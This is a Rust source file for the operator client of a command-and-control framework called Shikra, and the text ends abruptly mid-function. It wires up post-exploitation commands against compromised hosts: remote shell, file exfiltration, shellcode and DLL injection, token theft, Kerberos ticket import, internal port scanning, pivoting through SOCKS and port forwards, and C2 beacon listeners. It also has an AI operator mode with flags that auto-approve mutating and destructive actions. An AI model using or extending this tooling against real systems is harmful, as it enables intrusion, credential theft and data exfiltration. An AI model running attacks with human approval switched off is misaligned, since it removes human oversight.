use anyhow::{Context, Result};
use clap::{Parser, Subcommand};
use shikra_client::{ClientConfig, OperatorClient};
use shikra_transport::tls::{hex_decode, read_text_file};
use std::path::{Path, PathBuf};

#[derive(Debug, Parser)]
#[command(name = "shikra-client", version, about = "Shikra operator client")]
struct Cli {
    #[arg(long, env = "SHIKRA_SERVER", default_value = "https://127.0.0.1:8443")]
    server: String,

    #[arg(long, env = "SHIKRA_CA_CERT")]
    ca_cert: Option<PathBuf>,

    #[arg(long, env = "SHIKRA_OPERATOR_TOKEN")]
    token: Option<String>,

    #[arg(long, env = "SHIKRA_TLS_DOMAIN", default_value = "localhost")]
    tls_domain: String,

    #[command(subcommand)]
    command: Option<Command>,
}

#[derive(Debug, Subcommand)]
enum Command {
    /// List active sessions and beacons.
    Sessions,
    /// Print teamserver version.
    Version,
    /// Run a named task with JSON args (raw access to the task surface).
    Run {
        #[arg(long)]
        session: String,
        /// Task kind: whoami, hostname, pwd, cd, echo, shell, ls, cat, stat,
        /// rm, mkdir, mv, cp, download, upload, env, ps, netstat, ifconfig, sleep.
        kind: String,
        /// JSON arguments, e.g. '{"path":"/etc/hosts"}'.
        #[arg(long, default_value = "null")]
        args: String,
    },
    /// Execute a shell command on the target.
    Shell {
        #[arg(long)]
        session: String,
        /// Command to run (joined from remaining args).
        #[arg(trailing_var_arg = true, allow_hyphen_values = true)]
        command: Vec<String>,
    },
    /// Show the target working directory.
    Pwd {
        #[arg(long)]
        session: String,
    },
    /// Change the target working directory.
    Cd {
        #[arg(long)]
        session: String,
        path: String,
    },
    /// List a directory (defaults to the target cwd).
    Ls {
        #[arg(long)]
        session: String,
        #[arg(default_value = ".")]
        path: String,
    },
    /// Print a remote file's contents.
    Cat {
        #[arg(long)]
        session: String,
        path: String,
    },
    /// Download a remote file.
    Download {
        #[arg(long)]
        session: String,
        remote: String,
        /// Local destination (defaults to the remote file name).
        #[arg(long)]
        output: Option<PathBuf>,
        /// Ignore an existing partial file and start from the beginning.
        #[arg(long, default_value_t = false)]
        no_resume: bool,
    },
    /// Upload a local file.
    Upload {
        #[arg(long)]
        session: String,
        local: PathBuf,
        /// Remote destination (defaults to the local file name).
        #[arg(long)]
        remote: Option<String>,
    },
    /// List target processes.
    Ps {
        #[arg(long)]
        session: String,
    },
    /// Show target network connections.
    Netstat {
        #[arg(long)]
        session: String,
    },
    /// Show target network interfaces.
    Ifconfig {
        #[arg(long)]
        session: String,
    },
    /// Dump target environment variables.
    Env {
        #[arg(long)]
        session: String,
    },
    /// Start a local SOCKS5 proxy that tunnels through the session.
    Socks {
        #[arg(long)]
        session: String,
        #[arg(long, default_value = "127.0.0.1:1080")]
        listen: String,
    },
    /// Forward a local TCP port to a target reachable from the agent.
    Portfwd {
        #[arg(long)]
        session: String,
        #[arg(long, default_value = "127.0.0.1:8000")]
        listen: String,
        /// Destination as host:port, resolved from the agent's network.
        #[arg(long)]
        target: String,
    },
    /// Remote port forward: listen on the agent, forward to a destination
    /// reachable from the teamserver.
    Rportfwd {
        #[arg(long)]
        session: String,
        /// Bind address on the agent, e.g. 127.0.0.1:9000, or a pipe name
        /// with --transport pipe (Windows).
        #[arg(long)]
        bind: String,
        /// Destination host:port resolved from the teamserver.
        #[arg(long)]
        to: String,
        /// Listener transport: tcp (default), or pipe (Windows named pipe or
        /// Unix domain socket path) for pivot relays.
        #[arg(long, default_value = "tcp")]
        transport: String,
    },
    /// Stop a remote port forward.
    RportfwdStop {
        #[arg(long)]
        forward_id: String,
    },
    /// List active remote port forwards (pivot chains) with connection counts.
    Pivots,
    /// List recent tasks for a session.
    Tasks {
        #[arg(long)]
        session: String,
        #[arg(long, default_value_t = 50)]
        limit: u32,
    },
    /// Cancel a queued or running task.
    TaskCancel {
        #[arg(long)]
        session: String,
        #[arg(long)]
        task: String,
    },
    /// List running beacon listeners.
    Listeners,
    /// Start a beacon listener: http, quic, dns or wireguard.
    ListenerStart {
        /// Listener kind.
        #[arg(long)]
        kind: String,
        /// Listen address, e.g. 0.0.0.0:8080 (port 0 picks a free port).
        #[arg(long)]
        addr: String,
        /// DNS zone (dns listeners only).
        #[arg(long, default_value = "dns.shikra")]
        dns_zone: String,
    },
    /// Stop a beacon listener by id.
    ListenerStop {
        #[arg(long)]
        id: String,
    },
    /// List the teamserver's malleable C2 profiles.
    Profiles,
    /// Replace the teamserver's C2 profiles from a JSON file
    /// ({"profiles":[...]} or a bare array). Requires the admin role.
    ProfilesSet {
        /// Path to the profiles JSON file.
        file: PathBuf,
    },
    /// List cached Kerberos tickets for the current logon session (Windows).
    Klist {
        #[arg(long)]
        session: String,
    },
    /// Import a KRB-CRED (.kirbi) ticket into the current logon session (Windows).
    Ptt {
        #[arg(long)]
        session: String,
        file: PathBuf,
    },
    /// Purge cached Kerberos tickets for the current logon session (Windows).
    Purge {
        #[arg(long)]
        session: String,
    },
    /// Windows NetAPI enumeration: users, shares, sessions or localgroups.
    Net {
        #[arg(long)]
        session: String,
        /// One of: users, shares, sessions, localgroups.
        #[arg(long, default_value = "users")]
        action: String,
        /// Optional remote server (defaults to the local host).
        #[arg(long)]
        server: Option<String>,
    },
    /// Run a TCP connect scan from the agent's network position.
    Portscan {
        #[arg(long)]
        session: String,
        /// Single IP, hostname, CIDR or comma-separated list.
        #[arg(long)]
        target: String,
        /// Ports: "22,80,443", "1-1024", "top100" or "all".
        #[arg(long, default_value = "top100")]
        ports: String,
        #[arg(long, default_value_t = 800)]
        timeout_ms: u64,
        #[arg(long, default_value_t = 128)]
        concurrency: u64,
        /// Attempt to read a service banner from open ports.
        #[arg(long, default_value_t = false)]
        banner: bool,
    },
    /// TCP pivot: make the agent listen and tunnel raw traffic to the
    /// teamserver gRPC port, so downstream implants can route through it.
    Pivot {
        #[arg(long)]
        session: String,
        /// Bind address on the agent, e.g. 0.0.0.0:9001.
        #[arg(long)]
        bind: String,
        /// Destination the teamserver dials (defaults to its own gRPC address).
        #[arg(long)]
        to: Option<String>,
    },
    /// Execute a Beacon Object File (COFF/BOF) on the target.
    Bof {
        #[arg(long)]
        session: String,
        /// Path to the .obj COFF file.
        file: PathBuf,
        /// Arguments passed to the BOF entry point.
        #[arg(long, default_value = "")]
        args: String,
    },
    /// Spawn a process on the target.
    Spawn {
        #[arg(long)]
        session: String,
        /// Executable to launch.
        command: String,
        /// Arguments passed to the executable.
        #[arg(trailing_var_arg = true, allow_hyphen_values = true)]
        args: Vec<String>,
        /// Launch without a visible window (Windows).
        #[arg(long, default_value_t = true)]
        hidden: bool,
    },
    /// Terminate a process on the target.
    Kill {
        #[arg(long)]
        session: String,
        #[arg(long)]
        pid: u32,
    },
    /// Inject raw shellcode into a remote process (Windows).
    Inject {
        #[arg(long)]
        session: String,
        #[arg(long)]
        pid: u32,
        /// Path to the raw shellcode file.
        file: PathBuf,
    },
    /// Inject a DLL into a process via remote LoadLibraryW (Windows).
    DllInject {
        #[arg(long)]
        session: String,
        #[arg(long)]
        pid: u32,
        /// Path to the DLL as seen by the target.
        file: String,
    },
    /// Reflectively load a DLL into the agent process from memory (Windows).
    DllReflect {
        #[arg(long)]
        session: String,
        /// Path to the DLL file on the operator machine.
        file: PathBuf,
    },
    /// Spawn notepad.exe and inject a DLL into it (Windows).
    DllSpawn {
        #[arg(long)]
        session: String,
        /// Path to the DLL as seen by the target.
        file: String,
    },
    /// Migrate execution into another process by injecting shellcode (Windows).
    Migrate {
        #[arg(long)]
        session: String,
        #[arg(long)]
        pid: u32,
        /// Path to the raw shellcode file.
        file: PathBuf,
    },
    /// Steal a process token and impersonate it (Windows).
    StealToken {
        #[arg(long)]
        session: String,
        #[arg(long)]
        pid: u32,
    },
    /// Create a logon token and impersonate it (Windows).
    MakeToken {
        #[arg(long)]
        session: String,
        #[arg(long, default_value = ".")]
        domain: String,
        #[arg(long)]
        user: String,
        #[arg(long)]
        password: String,
    },
    /// Revert to the original token (Windows).
    Rev2self {
        #[arg(long)]
        session: String,
    },
    /// Execute a .NET assembly in-process via CLR hosting (Windows).
    ExecuteAssembly {
        #[arg(long)]
        session: String,
        /// Path to the .NET assembly (.exe/.dll).
        file: PathBuf,
        /// Argument string passed to the entry point.
        #[arg(long, default_value = "")]
        arguments: String,
    },
    /// Capture a screenshot of the target desktop.
    Screenshot {
        #[arg(long)]
        session: String,
        /// Local output path (BMP on Windows, PNG elsewhere).
        #[arg(long)]
        output: Option<PathBuf>,
    },
    /// Register a WASM extension on the target.
    WasmLoad {
        #[arg(long)]
        session: String,
        #[arg(long)]
        name: String,
        /// Path to the .wasm module.
        file: PathBuf,
    },
    /// Execute a registered WASM extension; exports `alloc`/`run`.
    WasmRun {
        #[arg(long)]
        session: String,
        #[arg(long)]
        name: String,
        #[arg(long, default_value = "")]
        args: String,
    },
    /// List WASM extensions registered on the target.
    WasmList {
        #[arg(long)]
        session: String,
    },
    /// Remove a WASM extension from the target.
    WasmRemove {
        #[arg(long)]
        session: String,
        #[arg(long)]
        name: String,
    },
    /// List the signed extension registry.
    Extensions,
    /// Install a signed extension package into the registry.
    ExtensionInstall {
        /// Path to the signed package JSON produced by `extension-pack`.
        package: PathBuf,
    },
    /// Download an extension payload from the registry.
    ExtensionFetch {
        /// Extension id (UUID).
        #[arg(long)]
        id: String,
        /// Output path for the raw payload.
        #[arg(long)]
        output: PathBuf,
    },
    /// Delete an extension from the registry.
    ExtensionDelete {
        #[arg(long)]
        id: String,
    },
    /// Sign a payload and produce an installable extension package.
    ExtensionPack {
        /// Payload file (.wasm / .dylib / .so / .dll).
        file: PathBuf,
        #[arg(long)]
        name: String,
        #[arg(long, default_value = "1.0.0")]
        version: String,
        /// wasm or native.
        #[arg(long, default_value = "wasm")]
        kind: String,
        /// any, macos, linux or windows.
        #[arg(long, default_value = "any")]
        platform: String,
        #[arg(long, default_value = "any")]
        arch: String,
        #[arg(long, default_value = "")]
        description: String,
        /// Path to the armory private key (hex seed file).
        #[arg(long)]
        key: PathBuf,
        /// Output package path.
        #[arg(long)]
        output: PathBuf,
    },
    /// Fetch an extension from the registry and load it on a target.
    ExtensionPush {
        #[arg(long)]
        session: String,
        #[arg(long)]
        name: String,
        /// Target platform filter (defaults to the session platform).
        #[arg(long, default_value = "")]
        platform: String,
    },
    /// Load a native (dynamic library) extension on the target.
    NativeLoad {
        #[arg(long)]
        session: String,
        #[arg(long)]
        name: String,
        /// Path to the shared library.
        file: PathBuf,
    },
    /// Run a registered native extension.
    NativeRun {
        #[arg(long)]
        session: String,
        #[arg(long)]
        name: String,
        #[arg(long, default_value = "")]
        args: String,
    },
    /// List native extensions registered on the target.
    NativeList {
        #[arg(long)]
        session: String,
    },
    /// Remove a native extension from the target.
    NativeRemove {
        #[arg(long)]
        session: String,
        #[arg(long)]
        name: String,
    },
    /// Conversational AI operator: the model plans and executes tools through
    /// the approval gate. Requires SHIKRA_LLM_BASE_URL / SHIKRA_LLM_MODEL.
    Ai {
        /// Prompt for the model (omit for an interactive REPL).
        prompt: Option<String>,
        /// Auto-approve mutating tools (shell, upload/download).
        #[arg(long)]
        auto_approve: bool,
        /// Additionally allow destructive tools (BOF, WASM).
        #[arg(long)]
        allow_destructive: bool,
        /// Maximum agentic loop iterations.
        #[arg(long, default_value_t = 25)]
        max_iterations: usize,
    },
    /// List operators and their roles.
    Operators,
    /// Create an operator and print its one-time token (admin only).
    OperatorAdd {
        #[arg(long)]
        name: String,
        /// Role: admin, operator (default), watcher.
        #[arg(long, default_value = "operator")]
        role: String,
    },
    /// Delete an operator by id (admin only).
    OperatorDel {
        #[arg(long)]
        id: String,
    },
    /// Team credential store.
    Creds {
        #[command(subcommand)]
        command: CredsCommand,
    },
    /// Team loot store.
    Loot {
        #[command(subcommand)]
        command: LootCommand,
    },
    /// Canary tokens that fire when touched.
    Canary {
        #[command(subcommand)]
        command: CanaryCommand,
    },
    /// Verify the tamper-evident audit hash chain.
    Audit,
    /// Reaction rules: automated responses to events.
    Reactions,
    /// Add a reaction rule.
    ReactionAdd {
        #[arg(long)]
        event: String,
        #[arg(long)]
        action: String,
    },
    /// Generate a Markdown engagement report (sessions, tasks, creds, loot, canaries, audit).
    Report {
        /// Output path (defaults to stdout).
        #[arg(long)]
        output: Option<PathBuf>,
    },
    /// Run nmap from the teamserver and store discovered hosts.
    Scan {
        /// Target host/CIDR, e.g. 10.0.0.0/24.
        target: String,
        /// Ports, e.g. "22,80,443" or "1-1024".
        #[arg(long, default_value = "")]
        ports: String,
        /// Extra nmap arguments (space-separated).
        #[arg(long, default_value = "")]
        arguments: String,
    },
    /// List discovered hosts from the inventory.
    Hosts,
    /// Show Metasploit RPC status.
    MsfStatus,
    /// Run a Metasploit console command via msfrpcd.
    MsfExec {
        /// Command, e.g. "db_hosts" or "use auxiliary/scanner/ssh/ssh_version".
        #[arg(trailing_var_arg = true, allow_hyphen_values = true)]
        command: Vec<String>,
    },
}

#[derive(Debug, Subcommand)]
enum CredsCommand {
    /// List stored credentials.
    List,
    /// Add a credential.
    Add {
        #[arg(long, default_value = "")]
        host: String,
        #[arg(long)]
        username: String,
        #[arg(long)]
        secret: String,
        #[arg(long, default_value = "password")]
        kind: String,
    },
}

#[derive(Debug, Subcommand)]
enum LootCommand {
    /// List loot metadata.
    List,
    /// Add loot from a local file.
    Add {
        #[arg(long)]
        name: String,
        file: PathBuf,
        #[arg(long, default_value = "file")]
        kind: String,
    },
}

#[derive(Debug, Subcommand)]
enum CanaryCommand {
    /// List canaries and trigger state.
    List,
    /// Create a canary token.
    Create {
        #[arg(long, default_value = "http")]
        kind: String,
        #[arg(long, default_value = "")]
        note: String,
    },
}

#[tokio::main]
async fn main() -> Result<()> {
    tracing_subscriber::fmt()
        .with_env_filter(
            tracing_subscriber::EnvFilter::try_from_default_env()
                .unwrap_or_else(|_| tracing_subscriber::EnvFilter::new("warn")),
        )
        .init();

    let cli = Cli::parse();

    let token = match cli.token {
        Some(token) => token,
        None => anyhow::bail!("operator token required (--token or SHIKRA_OPERATOR_TOKEN)"),
    };

    let ca_pem = match &cli.ca_cert {
        Some(path) => read_text_file(path)?,
        None => anyhow::bail!("--ca-cert (path to ca.pem) is required"),
    };

    let config = ClientConfig {
        endpoint: cli.server.clone(),
        ca_pem,
        token,
        domain: cli.tls_domain.clone(),
    };

    let mut client = OperatorClient::connect(&config).await?;

    match cli.command.unwrap_or(Command::Version) {
        Command::Version => {
            let version = client.version().await?;
            println!("shikra-server {version}");
        }
        Command::Sessions => {
            let sessions = client.sessions().await?;
            if sessions.is_empty() {
                println!("no active sessions");
            }
            for session in sessions {
                let status = match session.status {
                    2 => "stale",
                    3 => "dead",
                    _ => "active",
                };
                println!(
                    "{}\t{}\t{}\t{}\t{}\t{}",
                    session.id,
                    session.hostname,
                    session.username,
                    platform_name(session.platform),
                    session.remote_addr,
                    status,
                );
            }
        }
        Command::Run {
            session,
            kind,
            args,
        } => {
            let args: serde_json::Value =
                serde_json::from_str(&args).context("--args must be valid JSON")?;
            let result = client.run_task(&session, &kind, args).await?;
            print_result(&result);
            if result.exit_code != 0 {
                std::process::exit(result.exit_code);
            }
        }
        Command::Shell { session, command } => {
            let line = command.join(" ");
            if line.is_empty() {
                anyhow::bail!("shell requires a command");
            }
            let result = client
                .run_task(&session, "shell", serde_json::json!({ "command": line }))
                .await?;
            print_result(&result);
            if result.exit_code != 0 {
                std::process::exit(result.exit_code);
            }
        }
        Command::Pwd { session } => {
            let result = client
                .run_task(&session, "pwd", serde_json::Value::Null)
                .await?;
            print_result(&result);
        }
        Command::Cd { session, path } => {
            let result = client
                .run_task(&session, "cd", serde_json::json!({ "path": path }))
                .await?;
            print_result(&result);
        }
        Command::Ls { session, path } => {
            let result = client
                .run_task(&session, "ls", serde_json::json!({ "path": path }))
                .await?;
            print_ls(&result)?;
        }
        Command::Cat { session, path } => {
            let result = client
                .run_task(&session, "cat", serde_json::json!({ "path": path }))
                .await?;
            print_result(&result);
        }
        Command::Download {
            session,
            remote,
            output,
            no_resume,
        } => {
            let dest = output.unwrap_or_else(|| {
                PathBuf::from(
                    std::path::Path::new(&remote)
                        .file_name()
                        .map(|name| name.to_string_lossy().to_string())
                        .unwrap_or_else(|| "download.bin".into()),
                )
            });
            let resumed_at = tokio::fs::metadata(&dest)
                .await
                .map(|metadata| metadata.len())
                .unwrap_or(0);
            let bytes = client
                .download_resumable(&session, &remote, &dest, !no_resume)
                .await?;
            if resumed_at > 0 && resumed_at < bytes {
                println!(
                    "downloaded {bytes} bytes to {} (resumed at {resumed_at})",
                    dest.display()
                );
            } else {
                println!("downloaded {bytes} bytes to {}", dest.display());
            }
        }
        Command::Upload {
            session,
            local,
            remote,
        } => {
            let remote = remote.unwrap_or_else(|| {
                local
                    .file_name()
                    .map(|name| name.to_string_lossy().to_string())
                    .unwrap_or_else(|| "upload.bin".into())
            });
            let bytes = client.upload(&session, &local, &remote).await?;
            println!("uploaded {bytes} bytes to {remote}");
        }
        Command::Ps { session } => {
            let result = client
                .run_task(&session, "ps", serde_json::Value::Null)
                .await?;
            print_result(&result);
        }
        Command::Netstat { session } => {
            let result = client
                .run_task(&session, "netstat", serde_json::Value::Null)
                .await?;
            print_result(&result);
        }
        Command::Ifconfig { session } => {
            let result = client
                .run_task(&session, "ifconfig", serde_json::Value::Null)
                .await?;
            print_result(&result);
        }
        Command::Env { session } => {
            let result = client
                .run_task(&session, "env", serde_json::Value::Null)
                .await?;
            print_result(&result);
        }
        Command::Socks { session, listen } => {
            let listener = tokio::net::TcpListener::bind(&listen)
                .await
                .with_context(|| format!("failed to bind SOCKS5 listener {listen}"))?;
            let manager = std::sync::Arc::new(client.tunnel_manager(&session));
            println!("SOCKS5 proxy listening on {listen} (Ctrl+C to stop)");
            shikra_client::run_socks5(manager, session, listener).await?;
        }
        Command::Portfwd {
            session,
            listen,
            target,
        } => {
            let (host, port) = parse_host_port(&target)?;
            let listener = tokio::net::TcpListener::bind(&listen)
                .await
                .with_context(|| format!("failed to bind portfwd listener {listen}"))?;
            let manager = std::sync::Arc::new(client.tunnel_manager(&session));
            println!("port forward listening on {listen} -> {target} (Ctrl+C to stop)");
            shikra_client::run_portfwd(manager, session, listener, host, port).await?;
        }
        Command::Rportfwd {
            session,
            bind,
            to,
            transport,
        } => {
            let status = client
                .start_rportfwd_transport(&session, &bind, &to, &transport)
                .await?;
            println!(
                "rportfwd {} running={} {}",
                status.forward_id, status.running, status.message
            );
        }
        Command::RportfwdStop { forward_id } => {
            let status = client.stop_rportfwd(&forward_id).await?;
            println!(
                "rportfwd {} running={} {}",
                status.forward_id, status.running, status.message
            );
        }
        Command::Tasks { session, limit } => {
            let tasks = client.list_tasks(Some(&session), limit).await?;
            for task in tasks {
                let state = match shikra_proto::v1::TaskState::try_from(task.state) {
                    Ok(shikra_proto::v1::TaskState::Completed) => "completed",
                    Ok(shikra_proto::v1::TaskState::Failed) => "failed",
                    Ok(shikra_proto::v1::TaskState::Cancelled) => "cancelled",
                    Ok(shikra_proto::v1::TaskState::Running) => "running",
                    Ok(shikra_proto::v1::TaskState::Dispatched) => "dispatched",
                    _ => "pending",
                };
                // Tasks submitted by the AI copilot are tagged so operators
                // can audit copilot activity at a glance.
                let origin = if task.ai_initiated { "[ai]" } else { "----" };
                println!(
                    "{}\t{}\t{}\t{}\t{}",
                    task.id, state, origin, task.command, task.output
                );
            }
        }
        Command::TaskCancel { session, task } => {
            client.cancel_task(&session, &task).await?;
            println!("task {task} cancelled");
        }
        Command::Listeners => {
            let listeners = client.listeners().await?;
            if listeners.is_empty() {
                println!("no running listeners");
            }
            for listener in listeners {
                println!(
                    "{}\t{}\t{}\t{}\t{}",
                    listener.id, listener.kind, listener.addr, listener.running, listener.detail
                );
            }
        }
        Command::ListenerStart {
            kind,
            addr,
            dns_zone,
        } => {
            let listener = client.start_listener(&kind, &addr, &dns_zone).await?;
            println!(
                "{} {} on {} {}",
                listener.kind, listener.id, listener.addr, listener.detail
            );
        }
        Command::ListenerStop { id } => {
            client.stop_listener(&id).await?;
            println!("listener {id} stopped");
        }
        Command::Profiles => {
            let profiles = client.profiles().await?;
            let value = serde_json::json!({
                "profiles": profiles
                    .iter()
                    .map(|profile| serde_json::json!({
                        "name": profile.name,
                        "user_agent": profile.user_agent,
                        "enroll_uri": profile.enroll_uri,
                        "poll_uri": profile.poll_uri,
                        "request_headers": profile.request_headers,
                        "response_headers": profile.response_headers,
                        "poll_interval_secs": profile.poll_interval_secs,
                        "jitter_secs": profile.jitter_secs,
                    }))
                    .collect::<Vec<_>>()
            });
            println!("{}", serde_json::to_string_pretty(&value)?);
        }
        Command::ProfilesSet { file } => {
            let raw = tokio::fs::read_to_string(&file).await?;
            let value: serde_json::Value = serde_json::from_str(&raw)?;
            let list = value.get("profiles").cloned().unwrap_or(value);
            let list = list
                .as_array()
                .ok_or_else(|| anyhow::anyhow!("profiles file must contain a profiles array"))?;
            let mut converted = Vec::with_capacity(list.len());
            for entry in list {
                let name = entry
                    .get("name")
                    .and_then(|v| v.as_str())
                    .ok_or_else(|| anyhow::anyhow!("profile is missing a name"))?;
                let headers = |key: &str| -> std::collections::HashMap<String, String> {
                    entry
                        .get(key)
                        .and_then(|v| v.as_object())
                        .map(|map| {
                            map.iter()
                                .filter_map(|(k, v)| v.as_str().map(|s| (k.clone(), s.to_string())))
                                .collect()
                        })
                        .unwrap_or_default()
                };
                converted.push(shikra_proto::v1::ProfileInfo {
                    name: name.to_string(),
                    user_agent: entry
                        .get("user_agent")
                        .and_then(|v| v.as_str())
                        .unwrap_or_default()
                        .to_string(),
                    enroll_uri: entry
                        .get("enroll_uri")
                        .and_then(|v| v.as_str())
                        .unwrap_or("/api/v1/enroll")
                        .to_string(),
                    poll_uri: entry
                        .get("poll_uri")
                        .and_then(|v| v.as_str())
                        .unwrap_or("/api/v1/poll")
                        .to_string(),
                    request_headers: headers("request_headers"),
                    response_headers: headers("response_headers"),
                    poll_interval_secs: entry
                        .get("poll_interval_secs")
                        .and_then(|v| v.as_u64())
                        .unwrap_or(5),
                    jitter_secs: entry
                        .get("jitter_secs")
                        .and_then(|v| v.as_u64())
                        .unwrap_or(3),
                });
            }
            let count = converted.len();
            client.set_profiles(converted).await?;
            println!("applied {count} profile(s)");
        }
        Command::Pivots => {
            let forwards = client.list_rportfwds().await?;
            if forwards.is_empty() {
                println!("no active pivots");
            }
            for forward in forwards {
                println!(
                    "{}\t{}\t{}\t{}\t{}\t{}",
                    forward.forward_id,
                    forward.session_id,
                    forward.transport,
                    forward.bind,
                    forward.to,
                    forward.connections
                );
            }
        }
        Command::Klist { session } => {
            let result = client
                .run_task(&session, "kerb_list", serde_json::json!({}))
                .await?;
            print_result(&result);
            if result.exit_code != 0 {
                std::process::exit(result.exit_code);
            }
        }
        Command::Ptt { session, file } => {
            let bytes = tokio::fs::read(&file)
                .await
                .with_context(|| format!("failed to read {}", file.display()))?;
            let ticket = shikra_transport::tls::hex_encode(&bytes);
            let result = client
                .run_task(
                    &session,
                    "kerb_ptt",
                    serde_json::json!({ "ticket": ticket }),
                )
                .await?;
            print_result(&result);
            if result.exit_code != 0 {
                std::process::exit(result.exit_code);
            }
        }
        Command::Purge { session } => {
            let result = client
                .run_task(&session, "kerb_purge", serde_json::json!({}))
                .await?;
            print_result(&result);
            if result.exit_code != 0 {
                std::process::exit(result.exit_code);
            }
        }
        Command::Net {
            session,
            action,
            server,
        } => {
            let mut args = serde_json::json!({ "action": action });
            if let Some(server) = server {
                args["server"] = serde_json::Value::String(server);
            }
            let result = client.run_task(&session, "net", args).await?;
            print_result(&result);
            if result.exit_code != 0 {
                std::process::exit(result.exit_code);
            }
        }
        Command::Portscan {
            session,
            target,
            ports,
            timeout_ms,
            concurrency,
            banner,
        } => {
            let result = client
                .run_task(
                    &session,
                    "portscan",
                    serde_json::json!({
                        "target": target,
                        "ports": ports,
                        "timeout_ms": timeout_ms,
                        "concurrency": concurrency,
                        "banner": banner,
                    }),
                )
                .await?;
            if result.exit_code != 0 {
                print_result(&result);
                std::process::exit(result.exit_code);
            }
            let report: serde_json::Value =
                serde_json::from_slice(&result.output).context("invalid portscan report")?;
            println!(
                "scanned {} hosts / {} ports in {} ms",
                report["hosts_scanned"], report["ports_scanned"], report["duration_ms"]
            );
            if let Some(open) = report["open"].as_array() {
                for hit in open {
                    let host = hit["host"].as_str().unwrap_or_default();
                    let port = hit["port"].as_u64().unwrap_or(0);
                    match hit["banner"].as_str() {
                        Some(banner) if !banner.is_empty() => {
                            println!("{host}:{port} open  banner: {banner}")
                        }
                        _ => println!("{host}:{port} open"),
                    }
                }
            }
        }
        Command::Pivot { session, bind, to } => {
            let to = match to {
                Some(to) => to,
                None => cli
                    .server
                    .trim_start_matches("https://")
                    .trim_start_matches("http://")
                    .trim_end_matches('/')
                    .to_string(),
            };
            let status = client.start_rportfwd(&session, &bind, &to).await?;
            println!(
                "pivot listening on agent {bind} -> server {to} (forward {})",
                status.forward_id
            );
            println!("point downstream implants at https://{bind}");
        }
        Command::Bof {
            session,
            file,
            args,
        } => {
            let payload = tokio::fs::read(&file)
                .await
                .with_context(|| format!("failed to read {}", file.display()))?;
            let result = client
                .submit_task(
                    &session,
                    "bof",
                    serde_json::json!({ "args": args }),
                    payload,
                )
                .await?;
            for result in result {
                print_result(&result);
                if result.exit_code != 0 {
                    std::process::exit(result.exit_code);
                }
            }
        }
        Command::Spawn {
            session,
            command,
            args,
            hidden,
        } => {
            let result = client
                .run_task(
                    &session,
                    "spawn",
                    serde_json::json!({ "command": command, "args": args, "hidden": hidden }),
                )
                .await?;
            print_result(&result);
            if result.exit_code != 0 {
                std::process::exit(result.exit_code);
            }
        }
        Command::Kill { session, pid } => {
            let result = client
                .run_task(&session, "kill", serde_json::json!({ "pid": pid }))
                .await?;
            print_result(&result);
            if result.exit_code != 0 {
                std::process::exit(result.exit_code);
            }
        }
        Command::DllInject { session, pid, file } => {
            let result = client
                .run_task(
                    &session,
                    "dll_inject",
                    serde_json::json!({ "pid": pid, "path": file }),
                )
                .await?;
            print_result(&result);
            if result.exit_code != 0 {
                std::process::exit(result.exit_code);
            }
        }
        Command::DllReflect { session, file } => {
            let payload = read_binary(&file).await?;
            let result = client
                .run_task(
                    &session,
                    "dll_reflect",
                    serde_json::json!({ "payload": payload }),
                )
                .await?;
            print_result(&result);
            if result.exit_code != 0 {
                std::process::exit(result.exit_code);
            }
        }
        Command::DllSpawn { session, file } => {
            let result = client
                .run_task(&session, "dll_spawn", serde_json::json!({ "path": file }))
                .await?;
            print_result(&result);
            if result.exit_code != 0 {
                std::process::exit(result.exit_code);
            }
        }
        Command::Inject { session, pid, file } => {
            let payload = read_binary(&file).await?;
            let result = client
                .run_task(
                    &session,
                    "inject",
                    serde_json::json!({ "pid": pid, "shellcode": payload }),
                )
                .await?;
            print_result(&result);
            if result.exit_code != 0 {
                std::process::exit(result.exit_code);
            }
        }
        Command::Migrate { session, pid, file } => {
            let payload = read_binary(&file).await?;
            let result = client
                .run_task(
                    &session,
                    "migrate",
                    serde_json::json!({ "pid": pid, "shellcode": payload }),
                )
                .await?;
            print_result(&result);
            if result.exit_code != 0 {
                std::process::exit(result.exit_code);
            }
        }
        Command::StealToken { session, pid } => {
            let result = client
                .run_task(&session, "steal_token", serde_json::json!({ "pid": pid }))
                .await?;
            print_result(&result);
            if result.exit_code != 0 {
                std::process::exit(result.exit_code);
            }
        }
        Command::MakeToken {
            session,
            domain,
            user,
            password,
        } => {
            let result = client
                .run_task(
                    &session,
                    "make_token",
                    serde_json::json!({ "domain": domain, "user": user, "password": password }),
                )
                .await?;
            print_result(&result);
            if result.exit_code != 0 {
                std::process::exit(result.exit_code);
            }
        }
        Command::Rev2self { session } => {
            let result = client
                .run_task(&session, "rev2self", serde_json::Value::Null)
                .await?;
            print_result(&result);
            if result.exit_code != 0 {
                std::process::exit(result.exit_code);
            }
        }
        Command::ExecuteAssembly {
            session,
            file,
            arguments,
        } => {
            let payload = read_binary(&file).await?;
            let result = client
                .run_task(
                    &session,
                    "execute_assembly",
                    serde_json::json!({ "assembly": payload, "arguments": arguments }),
                )
                .await?;
            print_result(&result);
            if result.exit_code != 0 {
                std::process::exit(result.exit_code);
            }
        }
        Command::Screenshot { session, output } => {
            let result = client
                .run_task(&session, "screenshot", serde_json::Value::Null)
                .await?;
            if result.exit_code != 0 {
                print_result(&result);
                std::process::exit(result.exit_code);
            }
            let default_name = if cfg!(windows) {
                "screenshot.bmp"
            } else {
                "screenshot.png"
            };
            let path = output.unwrap_or_else(|| PathBuf::from(default_name));
            tokio::fs::write(&path, &result.output)
                .await
                .with_context(|| format!("failed to write {}", path.display()))?;
            println!(
                "screenshot saved to {} ({} bytes)",
                path.display(),
                result.output.len()
            );
        }
        Command::WasmLoad {
            session,
            name,
            file,
        } => {
            let payload = tokio::fs::read(&file)
                .await
                .with_context(|| format!("failed to read {}", file.display()))?;
            let result = client
                .submit_task(
                    &session,
                    "wasm_load",
                    serde_json::json!({ "name": name }),
                    payload,
                )
                .await?;
            for result in result {
                print_result(&result);
                if result.exit_code != 0 {
                    std::process::exit(result.exit_code);
                }
            }
        }
        Command::WasmRun {
            session,
            name,
            args,
        } => {
            let result = client
                .run_task(
                    &session,
                    "wasm_run",
                    serde_json::json!({ "name": name, "args": args }),
                )
                .await?;
            print_result(&result);
            if result.exit_code != 0 {
                std::process::exit(result.exit_code);
            }
        }
        Command::WasmList { session } => {
            let result = client
                .run_task(&session, "wasm_list", serde_json::Value::Null)
                .await?;
            print_result(&result);
        }
        Command::WasmRemove { session, name } => {
            let result = client
                .run_task(&session, "wasm_remove", serde_json::json!({ "name": name }))
                .await?;
            print_result(&result);
        }
        Command::Extensions => {
            let extensions = client.list_extensions().await?;
            if extensions.is_empty() {
                println!("no extensions installed");
            }
